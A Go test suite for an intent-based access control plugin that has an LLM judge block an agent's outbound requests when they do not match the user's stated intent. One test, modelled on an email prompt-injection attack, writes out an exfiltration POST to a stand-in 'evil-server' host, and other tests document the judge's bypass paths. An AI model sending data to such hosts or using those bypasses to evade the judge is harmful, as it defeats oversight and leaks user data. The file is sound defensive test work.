package ibac

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"strings"
	"testing"

	"github.com/kagenti/kagenti-extensions/authbridge/authlib/pipeline"
)

// fakeJudge records what it was asked and returns the configured
// verdict / err. Tests fail-closed pathways by setting err non-nil.
type fakeJudge struct {
	verdict string
	reason  string
	err     error

	gotIntent string
	gotAction string
	calls     int
}

func (f *fakeJudge) Evaluate(_ context.Context, intent, action string) (string, string, error) {
	f.calls++
	f.gotIntent = intent
	f.gotAction = action
	return f.verdict, f.reason, f.err
}

// newConfiguredIBAC returns an IBAC plugin pre-wired with a fake judge,
// minimal config, and a sensible bypass list. Uses the default
// no_intent_policy ("allow"). Callers that want to override behavior
// can mutate p.cfg / p.judge after the fact, or use
// newConfiguredIBACDeny for the strict-deny variant.
func newConfiguredIBAC(t *testing.T, fj *fakeJudge) *IBAC {
	t.Helper()
	p := NewIBAC()
	cfg := []byte(`{"judge_endpoint":"http://judge.invalid","judge_model":"test","timeout_ms":1000}`)
	if err := p.Configure(json.RawMessage(cfg)); err != nil {
		t.Fatalf("Configure: %v", err)
	}
	p.judge = fj
	return p
}

// newConfiguredIBACDeny returns an IBAC configured with
// no_intent_policy: "deny" — used by tests that exercise the strict
// fail-closed behavior on no_session / no_intent.
func newConfiguredIBACDeny(t *testing.T, fj *fakeJudge) *IBAC {
	t.Helper()
	p := NewIBAC()
	cfg := []byte(`{"judge_endpoint":"http://judge.invalid","judge_model":"test","timeout_ms":1000,"no_intent_policy":"deny"}`)
	if err := p.Configure(json.RawMessage(cfg)); err != nil {
		t.Fatalf("Configure: %v", err)
	}
	p.judge = fj
	return p
}

// invokeOnRequest mirrors the helper used by jwtvalidation tests:
// stamps Plugin/Phase on records that the plugin emits without going
// through the full pipeline driver.
func invokeOnRequest(p pipeline.Plugin, pctx *pipeline.Context) pipeline.Action {
	pctx.SetCurrentPlugin(p.Name(), pipeline.InvocationPhaseRequest)
	defer pctx.ClearCurrentPlugin()
	return p.OnRequest(context.Background(), pctx)
}

// makePCtx builds a minimal outbound pctx with a Session containing a
// single A2A user-intent message ("summarize my emails"). Defaults
// model a typical side-effect request — POST with a non-empty body —
// so the pctx reaches the judge unless the test opts into a transport-
// shaped path (body-less GET, housekeeping method, etc). Tests
// override fields by mutating the returned context.
func makePCtx(t *testing.T) *pipeline.Context {
	t.Helper()
	view := &pipeline.SessionView{
		ID: "s1",
		Events: []pipeline.SessionEvent{
			{
				Direction: pipeline.Inbound,
				Phase:     pipeline.SessionRequest,
				A2A: &pipeline.A2AExtension{
					Role: "user",
					Parts: []pipeline.A2APart{
						{Kind: "text", Content: "summarize my emails"},
					},
				},
			},
		},
	}
	return &pipeline.Context{
		Direction: pipeline.Outbound,
		Method:    "POST",
		Scheme:    "http",
		Host:      "weather-tool.team1.svc",
		Path:      "/api/weather",
		Headers:   http.Header{},
		Body:      []byte(`{"city":"sf"}`),
		Session:   view,
	}
}

// --- Configure ---

func TestConfigure_RequiresJudgeEndpoint(t *testing.T) {
	p := NewIBAC()
	err := p.Configure(json.RawMessage(`{"judge_model":"m"}`))
	if err == nil || !strings.Contains(err.Error(), "judge_endpoint") {
		t.Errorf("err = %v, want judge_endpoint required", err)
	}
}

func TestConfigure_RequiresJudgeModel(t *testing.T) {
	p := NewIBAC()
	err := p.Configure(json.RawMessage(`{"judge_endpoint":"http://j"}`))
	if err == nil || !strings.Contains(err.Error(), "judge_model") {
		t.Errorf("err = %v, want judge_model required", err)
	}
}

func TestConfigure_AppliesDefaults(t *testing.T) {
	p := NewIBAC()
	if err := p.Configure(json.RawMessage(`{"judge_endpoint":"http://j","judge_model":"m"}`)); err != nil {
		t.Fatalf("Configure: %v", err)
	}
	if p.cfg.TimeoutMs != 5000 {
		t.Errorf("default TimeoutMs = %d, want 5000", p.cfg.TimeoutMs)
	}
	if len(p.cfg.BypassHosts) == 0 {
		t.Errorf("expected non-empty default BypassHosts")
	}
	if len(p.cfg.BypassPaths) == 0 {
		t.Errorf("expected non-empty default BypassPaths")
	}
	if p.cfg.NoIntentPolicy != NoIntentPolicyAllow {
		t.Errorf("default NoIntentPolicy = %q, want %q (allow)",
			p.cfg.NoIntentPolicy, NoIntentPolicyAllow)
	}
}

func TestConfigure_NoIntentPolicy_RejectsUnknownValue(t *testing.T) {
	p := NewIBAC()
	cfg := `{"judge_endpoint":"http://j","judge_model":"m","no_intent_policy":"maybe"}`
	err := p.Configure(json.RawMessage(cfg))
	if err == nil {
		t.Fatal("expected error for unknown no_intent_policy value")
	}
	if !strings.Contains(err.Error(), "no_intent_policy") {
		t.Errorf("error should mention no_intent_policy; got %q", err.Error())
	}
}

func TestConfigure_NoIntentPolicy_AcceptsExplicitValues(t *testing.T) {
	for _, v := range []string{"allow", "deny"} {
		t.Run(v, func(t *testing.T) {
			p := NewIBAC()
			cfg := fmt.Sprintf(`{"judge_endpoint":"http://j","judge_model":"m","no_intent_policy":%q}`, v)
			if err := p.Configure(json.RawMessage(cfg)); err != nil {
				t.Fatalf("Configure(%q): %v", v, err)
			}
			if p.cfg.NoIntentPolicy != v {
				t.Errorf("NoIntentPolicy = %q, want %q", p.cfg.NoIntentPolicy, v)
			}
		})
	}
}

func TestConfigure_AgentLLMHostAddedToBypass(t *testing.T) {
	p := NewIBAC()
	cfg := `{"judge_endpoint":"http://j","judge_model":"m","agent_llm_host":"ollama.local"}`
	if err := p.Configure(json.RawMessage(cfg)); err != nil {
		t.Fatalf("Configure: %v", err)
	}
	found := false
	for _, h := range p.cfg.BypassHosts {
		if h == "ollama.local" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("agent_llm_host not added to BypassHosts; got %v", p.cfg.BypassHosts)
	}
}

func TestConfigure_RejectsUnknownFields(t *testing.T) {
	p := NewIBAC()
	cfg := `{"judge_endpoint":"http://j","judge_model":"m","unknown":"x"}`
	err := p.Configure(json.RawMessage(cfg))
	if err == nil {
		t.Errorf("expected error for unknown field")
	}
}

// --- OnRequest control flow ---

// Defense-in-depth: if our own judge call ever loops back through the
// pipeline (operator misconfig sending the judge endpoint via the
// proxy), IBAC must skip itself.
func TestOnRequest_ReentrancyHeader(t *testing.T) {
	fj := &fakeJudge{verdict: "deny", reason: "would block"}
	p := newConfiguredIBAC(t, fj)

	pctx := makePCtx(t)
	pctx.Headers.Set("X-IBAC-Judge", "1")
	action := invokeOnRequest(p, pctx)

	if action.Type != pipeline.Continue {
		t.Errorf("got %v, want Continue (reentrancy guard must short-circuit before judge)", action.Type)
	}
	if fj.calls != 0 {
		t.Errorf("judge invoked %d times during reentrancy guard; want 0", fj.calls)
	}
}

func TestOnRequest_BypassPath(t *testing.T) {
	fj := &fakeJudge{}
	p := newConfiguredIBAC(t, fj)

	pctx := makePCtx(t)
	pctx.Path = "/healthz"
	action := invokeOnRequest(p, pctx)

	if action.Type != pipeline.Continue {
		t.Errorf("got %v, want Continue for bypass path", action.Type)
	}
	if fj.calls != 0 {
		t.Errorf("judge invoked on bypass path; want 0 calls")
	}
}

func TestOnRequest_BypassHost_Default(t *testing.T) {
	fj := &fakeJudge{}
	p := newConfiguredIBAC(t, fj)

	pctx := makePCtx(t)
	// Default bypass list ships with "keycloak.*" — the agent's
	// token exchange to the Keycloak service must never be judged.
	pctx.Host = "keycloak.kagenti"
	action := invokeOnRequest(p, pctx)

	if action.Type != pipeline.Continue {
		t.Errorf("got %v, want Continue for default-bypass host", action.Type)
	}
	if fj.calls != 0 {
		t.Errorf("judge invoked on bypass host; want 0 calls")
	}
}

func TestOnRequest_BypassHost_ConfiguredAgentLLM(t *testing.T) {
	fj := &fakeJudge{}
	p := NewIBAC()
	cfg := `{"judge_endpoint":"http://j","judge_model":"m","agent_llm_host":"ollama.local"}`
	if err := p.Configure(json.RawMessage(cfg)); err != nil {
		t.Fatalf("Configure: %v", err)
	}
	p.judge = fj

	pctx := makePCtx(t)
	pctx.Host = "ollama.local:11434"
	action := invokeOnRequest(p, pctx)

	if action.Type != pipeline.Continue {
		t.Errorf("got %v, want Continue for agent_llm_host (with port)", action.Type)
	}
	if fj.calls != 0 {
		t.Errorf("judge invoked on agent_llm_host; want 0")
	}
}

// Inference traffic is bypassed by default — judging the agent's own
// reasoning loop is high-cost low-value. Operators flip judge_inference
// to opt in.
func TestOnRequest_InferenceBypassByDefault(t *testing.T) {
	fj := &fakeJudge{verdict: "deny", reason: "would block"}
	p := newConfiguredIBAC(t, fj)

	pctx := makePCtx(t)
	pctx.Extensions.Inference = &pipeline.InferenceExtension{Model: "gpt-4o-mini"}
	action := invokeOnRequest(p, pctx)

	if action.Type != pipeline.Continue {
		t.Errorf("got %v, want Continue (inference bypassed by default)", action.Type)
	}
	if fj.calls != 0 {
		t.Errorf("judge invoked on inference; want 0")
	}
}

func TestOnRequest_InferenceJudgedWhenEnabled(t *testing.T) {
	fj := &fakeJudge{verdict: "allow", reason: "ok"}
	p := NewIBAC()
	cfg := `{"judge_endpoint":"http://j","judge_model":"m","judge_inference":true}`
	if err := p.Configure(json.RawMessage(cfg)); err != nil {
		t.Fatalf("Configure: %v", err)
	}
	p.judge = fj

	pctx := makePCtx(t)
	pctx.Extensions.Inference = &pipeline.InferenceExtension{Model: "gpt-4"}
	invokeOnRequest(p, pctx)

	if fj.calls != 1 {
		t.Errorf("judge calls = %d, want 1 when judge_inference is true", fj.calls)
	}
	if !strings.Contains(fj.gotAction, "INFERENCE_MODEL: gpt-4") {
		t.Errorf("action did not include inference model; got %q", fj.gotAction)
	}
}

// no_intent under policy=deny: when the operator configures strict
// fail-closed semantics, missing intent must reject with "no_intent".
// Validates the legacy behavior is still reachable via explicit config.
func TestOnRequest_NoIntent_PolicyDeny_FailsClosed(t *testing.T) {
	fj := &fakeJudge{}
	p := newConfiguredIBACDeny(t, fj)

	pctx := makePCtx(t)
	pctx.Session = &pipeline.SessionView{ID: "empty"} // no events
	action := invokeOnRequest(p, pctx)

	if action.Type != pipeline.Reject {
		t.Errorf("got %v, want Reject when LastIntent is nil under policy=deny", action.Type)
	}
	if fj.calls != 0 {
		t.Errorf("judge should not be called when there's no intent")
	}
	inv := lastInvocation(t, pctx)
	if inv.Reason != "no_intent" {
		t.Errorf("Invocation reason = %q, want 'no_intent'", inv.Reason)
	}
}

// no_intent under policy=allow (default): missing intent means the
// request is either a legitimate agent self-action or a non-user-
// driven flow. IBAC should not be in the middle — Skip with reason
// "no_user_context" and Continue.
func TestOnRequest_NoIntent_PolicyAllow_Bypasses(t *testing.T) {
	fj := &fakeJudge{}
	p := newConfiguredIBAC(t, fj) // default policy=allow

	pctx := makePCtx(t)
	pctx.Session = &pipeline.SessionView{ID: "empty"} // no events
	action := invokeOnRequest(p, pctx)

	if action.Type != pipeline.Continue {
		t.Errorf("got %v, want Continue when no intent under policy=allow", action.Type)
	}
	if fj.calls != 0 {
		t.Errorf("judge should not be called when there's no intent")
	}
	inv := lastInvocation(t, pctx)
	if inv.Action != pipeline.ActionSkip {
		t.Errorf("Invocation action = %v, want ActionSkip", inv.Action)
	}
	if inv.Reason != "no_user_context" {
		t.Errorf("Invocation reason = %q, want 'no_user_context'", inv.Reason)
	}
	if inv.Details["sub_reason"] != "no_intent" {
		t.Errorf("Invocation sub_reason = %q, want 'no_intent'", inv.Details["sub_reason"])
	}
}

// Nil Session under policy=deny: forward-proxy at agent startup
// (before any inbound A2A) leaves pctx.Session nil. With strict
// fail-closed configured, that must reject with "no_session".
func TestOnRequest_NilSession_PolicyDeny_FailsClosed(t *testing.T) {
	fj := &fakeJudge{}
	p := newConfiguredIBACDeny(t, fj)

	pctx := makePCtx(t)
	pctx.Session = nil // before any inbound A2A
	action := invokeOnRequest(p, pctx)

	if action.Type != pipeline.Reject {
		t.Errorf("got %v, want Reject when Session is nil under policy=deny", action.Type)
	}
	if fj.calls != 0 {
		t.Errorf("judge should not be called when there's no session")
	}
	inv := lastInvocation(t, pctx)
	if inv.Reason != "no_session" {
		t.Errorf("Invocation reason = %q, want 'no_session'", inv.Reason)
	}
}

// Nil Session under policy=allow (default): the canonical "agent
// self-action at startup" case. The agent (e.g. exgentic-a2a-tool-
// calling) makes outbound calls during its bootstrap before any user
// turn — IBAC must Skip and Continue, not deny.
func TestOnRequest_NilSession_PolicyAllow_Bypasses(t *testing.T) {
	fj := &fakeJudge{}
	p := newConfiguredIBAC(t, fj) // default policy=allow

	pctx := makePCtx(t)
	pctx.Session = nil // before any inbound A2A
	action := invokeOnRequest(p, pctx)

	if action.Type != pipeline.Continue {
		t.Errorf("got %v, want Continue when Session is nil under policy=allow", action.Type)
	}
	if fj.calls != 0 {
		t.Errorf("judge should not be called when there's no session")
	}
	inv := lastInvocation(t, pctx)
	if inv.Action != pipeline.ActionSkip {
		t.Errorf("Invocation action = %v, want ActionSkip", inv.Action)
	}
	if inv.Reason != "no_user_context" {
		t.Errorf("Invocation reason = %q, want 'no_user_context'", inv.Reason)
	}
	if inv.Details["sub_reason"] != "no_session" {
		t.Errorf("Invocation sub_reason = %q, want 'no_session'", inv.Details["sub_reason"])
	}
}

// MCP protocol-housekeeping methods carry no user-actionable intent
// (they're connection setup or capability discovery, not side
// effects). IBAC must skip them; otherwise every agent that opens an
// MCP connection at startup gets blocked before any user turn.
func TestOnRequest_MCPHousekeepingBypass(t *testing.T) {
	cases := []string{
		"initialize",
		"ping",
		"tools/list",
		"prompts/list",
		"resources/list",
		"resources/templates/list",
		"completion/complete",
		"logging/setLevel",
		"notifications/initialized",
		"notifications/cancelled",
	}
	for _, method := range cases {
		t.Run(method, func(t *testing.T) {
			fj := &fakeJudge{}
			p := newConfiguredIBAC(t, fj)

			pctx := makePCtx(t)
			pctx.Session = nil // housekeeping must bypass before the session check
			pctx.Method = "POST"
			pctx.Host = "some-mcp-server"
			pctx.Path = "/mcp"
			pctx.Extensions.MCP = &pipeline.MCPExtension{Method: method}
			action := invokeOnRequest(p, pctx)

			if action.Type != pipeline.Continue {
				t.Errorf("got %v, want Continue for housekeeping method %q", action.Type, method)
			}
			if fj.calls != 0 {
				t.Errorf("judge should not be called for housekeeping method %q", method)
			}
		})
	}
}

// MCP tools/call must NOT be treated as housekeeping — it's the
// canonical side-effect method IBAC exists to judge.
func TestOnRequest_MCPToolsCallIsNotHousekeeping(t *testing.T) {
	fj := &fakeJudge{verdict: "allow"}
	p := newConfiguredIBAC(t, fj)

	pctx := makePCtx(t)
	pctx.Method = "POST"
	pctx.Host = "user-tool"
	pctx.Path = "/mcp"
	pctx.Extensions.MCP = &pipeline.MCPExtension{
		Method: "tools/call",
		Params: map[string]any{"name": "delete_user"},
	}
	_ = invokeOnRequest(p, pctx)

	if fj.calls != 1 {
		t.Errorf("judge calls = %d, want 1 (tools/call must be judged)", fj.calls)
	}
}

// Body-less retrieval-shaped requests (MCP Streamable HTTP SSE channel,
// agent-card fetches, OAuth metadata probes, CORS preflights, HEAD
// probes) carry no action payload and must bypass the judge with reason
// "transport_stream". Without this, the MCP client's SSE channel-open
// keeps getting 403'd, the connection dies, and the agent loops on
// reconnect. Covers GET, HEAD, OPTIONS — all share the body-less
// retrieval semantics per RFC 9110.
func TestOnRequest_TransportStreamBypass_BodylessRetrieval(t *testing.T) {
	for _, method := range []string{"GET", "HEAD", "OPTIONS"} {
		t.Run(method, func(t *testing.T) {
			fj := &fakeJudge{}
			p := newConfiguredIBAC(t, fj)

			pctx := makePCtx(t)
			pctx.Session = nil // bypass must fire before the session check
			pctx.Method = method
			pctx.Host = "exgentic-mcp-gsm8k-mcp:8000"
			pctx.Path = "/mcp"
			pctx.Body = nil
			action := invokeOnRequest(p, pctx)

			if action.Type != pipeline.Continue {
				t.Errorf("got %v, want Continue for body-less %s", action.Type, method)
			}
			if fj.calls != 0 {
				t.Errorf("judge calls = %d, want 0 (body-less %s must not reach judge)", fj.calls, method)
			}
			inv := lastInvocation(t, pctx)
			if inv.Action != pipeline.ActionSkip {
				t.Errorf("Invocation action = %v, want ActionSkip", inv.Action)
			}
			if inv.Reason != "transport_stream" {
				t.Errorf("Invocation reason = %q, want 'transport_stream'", inv.Reason)
			}
		})
	}
}

// Body-having retrieval-shaped requests (rare, but legal — e.g. some
// search APIs accept GET with a JSON body) must still reach the judge:
// the body is the action.
func TestOnRequest_TransportStreamBypass_GETWithBodyIsJudged(t *testing.T) {
	fj := &fakeJudge{verdict: "allow"}
	p := newConfiguredIBAC(t, fj)

	pctx := makePCtx(t)
	pctx.Method = "GET"
	pctx.Host = "search-api"
	pctx.Path = "/q"
	pctx.Body = []byte(`{"q":"acme financials"}`)
	_ = invokeOnRequest(p, pctx)

	if fj.calls != 1 {
		t.Errorf("judge calls = %d, want 1 (GET with body is an action)", fj.calls)
	}
}

// Body-less POST/PUT/DELETE/PATCH must NOT bypass — the absence of
// body alone isn't enough; the method must signal "retrieval" too.
// A body-less POST is unusual but legal (semantic "do action") and
// IBAC should still judge it. (Body-less DELETE *with* the
// Mcp-Session-Id header is its own special case — see
// TestOnRequest_TransportStream_MCPSessionTerminate.)
func TestOnRequest_TransportStreamBypass_BodylessPOSTIsJudged(t *testing.T) {
	for _, method := range []string{"POST", "PUT", "DELETE", "PATCH"} {
		t.Run(method, func(t *testing.T) {
			fj := &fakeJudge{verdict: "allow"}
			p := newConfiguredIBAC(t, fj)

			pctx := makePCtx(t)
			pctx.Method = method
			pctx.Host = "api.example.com"
			pctx.Path = "/refresh"
			pctx.Body = nil
			_ = invokeOnRequest(p, pctx)

			if fj.calls != 1 {
				t.Errorf("judge calls = %d, want 1 for body-less %s", fj.calls, method)
			}
		})
	}
}

// MCP Streamable HTTP session termination: DELETE to the MCP
// endpoint with the Mcp-Session-Id header. Per spec, MCP clients
// send this at end-of-conversation to release server-side session
// state. It carries no payload and no user-actionable intent —
// must bypass the judge with reason "transport_stream".
//
// Without this bypass, the judge sees "DELETE http://...mcp" with
// an empty body and reasonably (but wrongly) responds along the
// lines of "Action involves deleting data, which is not strictly
// necessary for user intent" — a 403 on routine protocol cleanup
// at end-of-conversation.
func TestOnRequest_TransportStream_MCPSessionTerminate(t *testing.T) {
	fj := &fakeJudge{}
	p := newConfiguredIBAC(t, fj)

	pctx := makePCtx(t)
	pctx.Method = "DELETE"
	pctx.Host = "exgentic-mcp-gsm8k-mcp:8000"
	pctx.Path = "/mcp"
	pctx.Body = nil
	pctx.Headers.Set("Mcp-Session-Id", "abc-123")
	action := invokeOnRequest(p, pctx)

	if action.Type != pipeline.Continue {
		t.Errorf("got %v, want Continue for MCP session terminate", action.Type)
	}
	if fj.calls != 0 {
		t.Errorf("judge calls = %d, want 0 (session terminate must not reach judge)", fj.calls)
	}
	inv := lastInvocation(t, pctx)
	if inv.Action != pipeline.ActionSkip {
		t.Errorf("Invocation action = %v, want ActionSkip", inv.Action)
	}
	if inv.Reason != "transport_stream" {
		t.Errorf("Invocation reason = %q, want 'transport_stream'", inv.Reason)
	}
}

// Body-less DELETE WITHOUT the Mcp-Session-Id header must still be
// judged. A real "delete this resource" call (e.g. DELETE /api/
// users/42) carries no MCP session header and is exactly the kind
// of side-effect action IBAC exists to evaluate. The header is the
// load-bearing distinguisher between transport cleanup and a user-
// meaningful delete.
func TestOnRequest_TransportStream_BodylessDELETEWithoutHeaderIsJudged(t *testing.T) {
	fj := &fakeJudge{verdict: "allow"}
	p := newConfiguredIBAC(t, fj)

	pctx := makePCtx(t)
	pctx.Method = "DELETE"
	pctx.Host = "api.example.com"
	pctx.Path = "/api/users/42"
	pctx.Body = nil
	// no Mcp-Session-Id header
	_ = invokeOnRequest(p, pctx)

	if fj.calls != 1 {
		t.Errorf("judge calls = %d, want 1 (real DELETE without MCP header must be judged)", fj.calls)
	}
}

// DELETE + Mcp-Session-Id header + non-empty body must still be
// judged. The header alone isn't sufficient — the body-first guard
// in isTransportShaped is what keeps an attacker (or a misbehaving
// SDK) from smuggling action payload through what looks like
// transport cleanup. Locks in the same "header + body → not
// bypassed" invariant that body-having GETs already cover.
func TestOnRequest_TransportStream_MCPSessionTerminate_WithBodyIsJudged(t *testing.T) {
	fj := &fakeJudge{verdict: "allow"}
	p := newConfiguredIBAC(t, fj)

	pctx := makePCtx(t)
	pctx.Method = "DELETE"
	pctx.Host = "exgentic-mcp-gsm8k-mcp:8000"
	pctx.Path = "/mcp"
	pctx.Body = []byte(`{"unexpected":"payload"}`)
	pctx.Headers.Set("Mcp-Session-Id", "abc-123")
	_ = invokeOnRequest(p, pctx)

	if fj.calls != 1 {
		t.Errorf("judge calls = %d, want 1 (DELETE+Mcp-Session-Id with body must be judged, not bypassed)", fj.calls)
	}
}

// describeAction's first non-empty token must be the HTTP method, with
// no leading whitespace. This locks in the listener-side pctx.Method
// wiring contract: if any listener regresses to leaving Method empty,
// describeAction renders " http://..." (note the leading space) and
// the judge sees a malformed prompt while operators see a confusing
// session-event display. The visible-symptom test catches that here
// rather than relying on the listener-package tests alone.
func TestOnRequest_DescribeActionHasNoLeadingWhitespace(t *testing.T) {
	fj := &fakeJudge{verdict: "allow"}
	p := newConfiguredIBAC(t, fj)

	pctx := makePCtx(t) // POST + body, will be judged
	_ = invokeOnRequest(p, pctx)

	if fj.calls != 1 {
		t.Fatalf("expected judge to be called once; got calls=%d", fj.calls)
	}
	if fj.gotAction == "" {
		t.Fatal("describeAction was empty; cannot assert format")
	}
	if first := fj.gotAction[0]; first == ' ' || first == '\t' || first == '\n' {
		t.Errorf("describeAction starts with whitespace (listener Method regression?); got %q", fj.gotAction)
	}
	if !strings.HasPrefix(fj.gotAction, "POST ") {
		t.Errorf("describeAction should start with 'POST '; got %q", fj.gotAction)
	}
}

// Email-poison parity: this is the canonical case the plugin exists
// for. Raw HTTP exfiltration to an unknown server, no MCP/Inference
// extensions, judge denies → 403. This test is the contract that
// ports the original huang195/ibac demo's threat model.
func TestOnRequest_EmailPoisonParity(t *testing.T) {
	fj := &fakeJudge{
		verdict: "deny",
		reason:  "POSTing to unknown server is unrelated to summarize emails",
	}
	p := newConfiguredIBAC(t, fj)

	pctx := makePCtx(t)
	pctx.Method = "POST"
	pctx.Host = "evil-server.ibac.svc.cluster.local:9999"
	pctx.Path = "/collect?code=X7B-92K&budget=2.4M"
	pctx.Body = []byte("x")
	action := invokeOnRequest(p, pctx)

	if action.Type != pipeline.Reject {
		t.Fatalf("got %v, want Reject (email-poison must be blocked)", action.Type)
	}
	// The judge must have seen the bare HTTP request line — without
	// MCP enrichment, this is all the plugin has to work with.
	if !strings.Contains(fj.gotAction, "POST http://evil-server.ibac.svc.cluster.local:9999/collect?code=X7B-92K&budget=2.4M") {
		t.Errorf("action description missing raw HTTP line; got %q", fj.gotAction)
	}
	if !strings.Contains(fj.gotIntent, "summarize my emails") {
		t.Errorf("intent not extracted from session; got %q", fj.gotIntent)
	}
	inv := lastInvocation(t, pctx)
	if inv.Reason != "blocked" {
		t.Errorf("reason = %q, want 'blocked'", inv.Reason)
	}
	if inv.Details["llm_reason"] != fj.reason {
		t.Errorf("llm_reason = %q, want %q", inv.Details["llm_reason"], fj.reason)
	}
	if !strings.Contains(inv.Details["intent_preview"], "summarize my emails") {
		t.Errorf("intent_preview = %q, want it to contain the intent", inv.Details["intent_preview"])
	}
}

// MCP enrichment: when mcp-parser ran first, the action description
// includes the parsed tool name and args.
func TestOnRequest_MCPEnrichment(t *testing.T) {
	fj := &fakeJudge{verdict: "deny", reason: "delete_user is unrelated"}
	p := newConfiguredIBAC(t, fj)

	pctx := makePCtx(t)
	pctx.Method = "POST"
	pctx.Host = "user-tool"
	pctx.Path = "/mcp"
	pctx.Extensions.MCP = &pipeline.MCPExtension{
		Method: "tools/call",
		Params: map[string]any{
			"name":      "delete_user",
			"arguments": map[string]any{"user_id": "alice"},
		},
	}
	action := invokeOnRequest(p, pctx)

	if action.Type != pipeline.Reject {
		t.Fatalf("got %v, want Reject", action.Type)
	}
	if !strings.Contains(fj.gotAction, "MCP_TOOL: delete_user") {
		t.Errorf("action did not include MCP_TOOL; got %q", fj.gotAction)
	}
	if !strings.Contains(fj.gotAction, "alice") {
		t.Errorf("action did not include MCP args; got %q", fj.gotAction)
	}
}

// Plain HTTP path with no parsers — should still be judged. The bare
// METHOD scheme://host/path line is what the judge gets.
func TestOnRequest_PlainHTTPNoParsers(t *testing.T) {
	fj := &fakeJudge{verdict: "allow", reason: "weather lookup is fine"}
	p := newConfiguredIBAC(t, fj)

	pctx := makePCtx(t)
	pctx.Method = "GET"
	pctx.Host = "api.weather.com"
	pctx.Path = "/v1/forecast?city=Boston"
	action := invokeOnRequest(p, pctx)

	if action.Type != pipeline.Continue {
		t.Errorf("got %v, want Continue", action.Type)
	}
	if fj.calls != 1 {
		t.Fatalf("judge calls = %d, want 1", fj.calls)
	}
	if !strings.Contains(fj.gotAction, "GET http://api.weather.com/v1/forecast?city=Boston") {
		t.Errorf("action description = %q, want bare HTTP line", fj.gotAction)
	}
}

// Authorization values must NEVER reach the judge LLM — bearer tokens
// in a judge prompt are a credential exposure risk via judge logs /
// upstream LLM provider retention.
func TestOnRequest_AuthorizationHeaderNotInActionDescription(t *testing.T) {
	fj := &fakeJudge{verdict: "allow", reason: "ok"}
	p := newConfiguredIBAC(t, fj)

	pctx := makePCtx(t)
	pctx.Headers.Set("Authorization", "Bearer SUPER-SECRET-TOKEN-VALUE")
	pctx.Headers.Set("Cookie", "session=SECRET-COOKIE-VALUE")
	invokeOnRequest(p, pctx)

	if strings.Contains(fj.gotAction, "SUPER-SECRET") {
		t.Errorf("judge prompt leaked Authorization value: %q", fj.gotAction)
	}
	if strings.Contains(fj.gotAction, "SECRET-COOKIE") {
		t.Errorf("judge prompt leaked Cookie value: %q", fj.gotAction)
	}
}

// Judge errors fail closed: 503 not 403, since it's an availability
// issue not a policy denial. Operators distinguish "judge is down"
// from "request was actually bad" via the status code.
func TestOnRequest_JudgeError_503(t *testing.T) {
	fj := &fakeJudge{err: errors.New("connection refused")}
	p := newConfiguredIBAC(t, fj)

	pctx := makePCtx(t)
	action := invokeOnRequest(p, pctx)

	if action.Type != pipeline.Reject {
		t.Fatalf("got %v, want Reject on judge error", action.Type)
	}
	if action.Violation.Status != 503 {
		t.Errorf("RejectStatus = %d, want 503 (judge errors are availability issues, not policy denials)",
			action.Violation.Status)
	}
	inv := lastInvocation(t, pctx)
	if inv.Reason != "judge_unavailable" {
		t.Errorf("reason = %q, want 'judge_unavailable'", inv.Reason)
	}
}

// Judge "uncertain" errors (parse / unrecognized verdict) fail closed
// with a DIFFERENT code: 403 ibac.judge_uncertain rather than 503
// ibac.judge_unavailable. The judge IS up — it just emitted output
// we can't act on. Routing this through "unavailable" would inflate
// the "judge down" metric on every model misbehavior.
func TestOnRequest_JudgeUncertain_403(t *testing.T) {
	fj := &fakeJudge{err: fmt.Errorf("%w: model emitted gibberish", ErrJudgeUncertain)}
	p := newConfiguredIBAC(t, fj)

	pctx := makePCtx(t)
	action := invokeOnRequest(p, pctx)

	if action.Type != pipeline.Reject {
		t.Fatalf("got %v, want Reject on judge_uncertain", action.Type)
	}
	if action.Violation.Status != 403 {
		t.Errorf("Violation.Status = %d, want 403 (uncertain judge output is a fail-closed deny, not infra outage)",
			action.Violation.Status)
	}
	inv := lastInvocation(t, pctx)
	if inv.Reason != "judge_uncertain" {
		t.Errorf("reason = %q, want 'judge_uncertain'", inv.Reason)
	}
}

func TestOnRequest_AllowVerdict(t *testing.T) {
	fj := &fakeJudge{verdict: "allow", reason: "looks fine"}
	p := newConfiguredIBAC(t, fj)

	pctx := makePCtx(t)
	action := invokeOnRequest(p, pctx)

	if action.Type != pipeline.Continue {
		t.Errorf("got %v, want Continue on allow", action.Type)
	}
	inv := lastInvocation(t, pctx)
	if inv.Action != pipeline.ActionAllow {
		t.Errorf("Invocation.Action = %q, want allow", inv.Action)
	}
	if inv.Details["llm_reason"] != "looks fine" {
		t.Errorf("llm_reason = %q, want 'looks fine'", inv.Details["llm_reason"])
	}
}

func TestOnRequest_DenyVerdict(t *testing.T) {
	fj := &fakeJudge{verdict: "deny", reason: "off-policy"}
	p := newConfiguredIBAC(t, fj)

	pctx := makePCtx(t)
	action := invokeOnRequest(p, pctx)

	if action.Type != pipeline.Reject {
		t.Fatalf("got %v, want Reject on deny verdict", action.Type)
	}
	if action.Violation.Status != 403 {
		t.Errorf("RejectStatus = %d, want 403 on policy deny", action.Violation.Status)
	}
}

// Unconfigured plugin returns 503 — Configure must run before traffic.
func TestOnRequest_Unconfigured(t *testing.T) {
	p := NewIBAC()
	pctx := &pipeline.Context{Headers: http.Header{}}
	action := invokeOnRequest(p, pctx)
	if action.Type != pipeline.Reject {
		t.Errorf("got %v, want Reject for unconfigured plugin", action.Type)
	}
}

// --- helpers ---

// lastInvocation returns the most recent Invocation pushed onto the
// outbound side of pctx (IBAC always runs outbound).
func lastInvocation(t *testing.T, pctx *pipeline.Context) pipeline.Invocation {
	t.Helper()
	if pctx.Extensions.Invocations == nil || len(pctx.Extensions.Invocations.Outbound) == 0 {
		t.Fatalf("expected at least one outbound Invocation; got %+v", pctx.Extensions.Invocations)
	}
	out := pctx.Extensions.Invocations.Outbound
	return out[len(out)-1]
}
